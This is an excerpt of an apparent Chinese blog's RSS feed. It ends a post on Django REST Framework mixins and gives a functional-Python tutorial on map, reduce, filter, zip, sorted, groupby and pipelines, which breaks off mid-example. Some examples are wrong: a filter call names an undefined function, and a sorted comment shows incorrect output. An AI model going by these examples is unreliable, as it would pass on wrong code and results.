     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;MultipleObjectAPIView构建了view, 然后加上了inListModelMixin和CreateModelMixin.&lt;/p&gt;
&lt;p&gt;基类提供了核心功能，mixin类提供了 .list() 和 .create() 动作。然后显式的把 get 和 post 方法与合适的动作绑定在一起。&lt;/p&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20778853"&gt;Mixin是什么概念&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/tutorial/3-class-based-views.html"&gt;django-rest-framework.org/tutorial/3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/533631/what-is-a-mixin-and-why-are-they-useful"&gt;what-is-a-mixin-and-why-are-they-useful&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/gzlaiyonghao/article/details/1656969"&gt;Mixin 扫盲班&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learning-python-mixin.html</guid><category>python</category></item><item><title>用函数式风格写python</title><link>/python-functional.html</link><description>&lt;h2&gt;缘起&lt;/h2&gt;
&lt;p&gt;定制edx的过程中，需要自己去筛选处理不少数据，大多是直接从mongo中挖出。 大部分的工作都可以抽象描述成按条件筛选出一个数据集的子集，数据集包括courses(课程对象集合),commentThread(论坛帖子)，comment（帖子评论）,courseInfo（课程公告），这些数据的结构都极其相似，都是类列表数据（跟操作list基本一样）， 恰好前段时间一直在关注函数式，也在学习Scheme，所以自然想到用函数式风格处理list是最方便的了。&lt;/p&gt;
&lt;p&gt;一试，果不其然。&lt;/p&gt;
&lt;p&gt;高阶函数提高了程序的模块性。比如使用一个高阶函数来实现排序，可以使得我们使用不同的条件(函数)来排序，这就将排序条件和排序过程清楚地划分开来。很容易写函数来实现插拔。&lt;/p&gt;
&lt;p&gt;具体使用中，比如筛选过程使用高阶函数(def course_filter)来写，之后的筛选条件都写成filter_by_xx形式:filter_by_name/filter_by_subject,清晰明了，提高代码复用性，也导致了良好的一致性，进而使可读性提高。&lt;/p&gt;
&lt;p&gt;使用函数风格来写函数，具体的 理念/原则 可以通过搜索函数式编程找到，其中一些比较关键的地方:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;函数是"一等公民",使用高阶函数&lt;/li&gt;
&lt;li&gt;尽量不要产生"副作用"&lt;/li&gt;
&lt;li&gt;函数只是返回新的值，不修改变量.&lt;/li&gt;
&lt;li&gt;引用透明(确定性),任何时候只要参数相同，引用函数所得到的返回值总是相同的。&lt;/li&gt;
&lt;li&gt;函数应该像管道&lt;/li&gt;
&lt;li&gt;把函数当成变量来用，关注于描述问题而不是怎么实现，这样可以让代码更易读&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;函数式编程的几个技术&lt;/h2&gt;
&lt;p&gt;其实在python中以下几个东西基本也可以用for(列表推导)来做，不过列表推导不是模块化的，倾向于一次性使用、&lt;/p&gt;
&lt;h3&gt;map&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#列表长度&lt;/span&gt;
&lt;span class="n"&gt;name_len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hao&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;chen&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;coolshell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;name_len&lt;/span&gt;
&lt;span class="c1"&gt;# 输出 [3, 4, 9]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样的代码是在描述要干什么，而不是怎么干  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#首字母大写&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;toUpper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;upper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;upper_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;toUpper&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hao&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;chen&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;coolshell&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="c1"&gt;# 输出 [&amp;#39;HAO&amp;#39;, &amp;#39;CHEN&amp;#39;, &amp;#39;COOLSHELL&amp;#39;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#求一组数据的平方数&lt;/span&gt;
&lt;span class="n"&gt;squares&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;squares&lt;/span&gt;
&lt;span class="c1"&gt;# 输出 [0, 1, 4, 9, 16, 25, 36, 49, 64]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;reduce&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#求和 相当于：((((1+2)+3)+4)+5) ）&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="c1"&gt;# 输出 15&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#数组中正数的平均值&lt;/span&gt;
&lt;span class="n"&gt;num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;positive_num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;average&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;reduce&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;positive_num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;positive_num&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#避免了变量倒来倒去逻辑&lt;/span&gt;
&lt;span class="c1"&gt;#代码变成了在描述你要干什么，而不是怎么去干。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;map函数的实现(js)&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;var map = function (mappingFunction, list) {
  var result = [];
  forEach(list, function (item) {
    result.push(mappingFunction(item));
  });
  return result;
};
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;filter&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[6,7]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#是否是成年人&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_adult&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;=&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="n"&gt;age_list&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age_list&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[18,19]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以作为高阶函数的参数,模块化，可插拔&lt;/p&gt;
&lt;h2&gt;zip&lt;/h2&gt;
&lt;p&gt;zip()是Python的一个内建函数，它接受一系列可迭代的对象作为参数，将对象中对应的元素打包成一个个tuple（元组），然后返回由这些tuples组成的list（列表）&lt;/p&gt;
&lt;p&gt;若传入参数的长度不等，则返回list的长度和参数中长度最短的对象相同。利用*号操作符，可以将list unzip（解压）&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;zipped&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[(1, 4), (2, 5), (3, 6)]&lt;/span&gt;
&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[(1, 4), (2, 5), (3, 6)]&lt;/span&gt;
&lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;zipped&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[(1, 2, 3), (4, 5, 6)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;sorted和groupby&lt;/h3&gt;
&lt;h4&gt;sorted&lt;/h4&gt;
&lt;p&gt;sorted([...],key = fuc) &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#[1,2,3,4,5,6]&lt;/span&gt;

&lt;span class="c1"&gt;#reverse：注明升序还是降序，True--降序，False--升序（默认）&lt;/span&gt;
&lt;span class="c1"&gt;#fuc 经常使用lambda&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;groupby&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;groupby&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;abbcdddef&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,[&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;aa&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;bb&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;b&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;cc&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;dd&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;ee&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;e&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;ff&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;f&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意先排序(sorted),groupby("abbca")中前后两个a不会连在一起。&lt;/p&gt;
&lt;p&gt;groupby(list,func)的返回值(i,j)，i是func的计算结果；j是一个迭代器，j的内容是经过func计算值相同的lst中的元素；  &lt;/p&gt;
&lt;p&gt;本质是mapreduce  所以记不住全局,只有一个交换空间，所以必须相邻&lt;/p&gt;
&lt;h3&gt;pipeline&lt;/h3&gt;
&lt;p&gt;pipeline 管道借鉴于Unix Shell的管道操作——把若干个命令串起来(他的设哲学就是KISS – 让每个功能就做一件事，并把这件事做到极致)，前面命令的输出成为后面命令的输入，如此完成一个流式计算。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#1）找出偶数。&lt;/span&gt;
&lt;span class="c1"&gt;#2）乘以3&lt;/span&gt;
&lt;span class="c1"&gt;#3）转成字符串返回&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;even_filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;multiply_by_three&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;nums&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
